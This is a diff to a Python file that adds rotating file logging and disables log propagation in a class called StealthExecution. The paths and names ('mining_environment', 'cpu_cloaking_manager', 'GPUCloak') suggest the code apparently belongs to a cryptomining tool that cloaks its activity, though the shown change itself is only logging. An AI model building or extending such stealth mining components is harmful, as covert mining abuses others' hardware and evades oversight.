@@ -33,6 +33,7 @@ from typing import List, Dict, Any, Optional, Set
 import logging
 import ctypes
 import ctypes.util
+from pathlib import Path
 
 # 🔧 EMERGENCY FIX: Import unified logging for proper CPU logger
 try:
@@ -71,6 +72,24 @@ class StealthExecution:
         else:
             self.logger = logger
             self.logger.info("🔒 [CPU-ONLY] StealthExecution initialized with custom logger")
+        # 🚫 Ensure CPU logger doesn't propagate to root to avoid GPUCloak prefix
+        self.logger.propagate = False
+        # 🚀 Ensure at least one handler; otherwise add CPU-specific file handler
+        if not self.logger.handlers:
+            try:
+                from logging.handlers import RotatingFileHandler
+                log_dir = Path('/app/mining_environment/logs')
+                log_dir.mkdir(parents=True, exist_ok=True)
+                file_handler = RotatingFileHandler(
+                    log_dir / 'cpu_cloaking_manager.log',
+                    maxBytes=10*1024*1024,
+                    backupCount=5,
+                    encoding='utf-8'
+                )
+                file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+                self.logger.addHandler(file_handler)
+            except Exception:
+                self.logger.addHandler(logging.StreamHandler(sys.stdout))
         self.comm_rotation_interval = comm_rotation_interval
         self._running = False
         self._thread = None
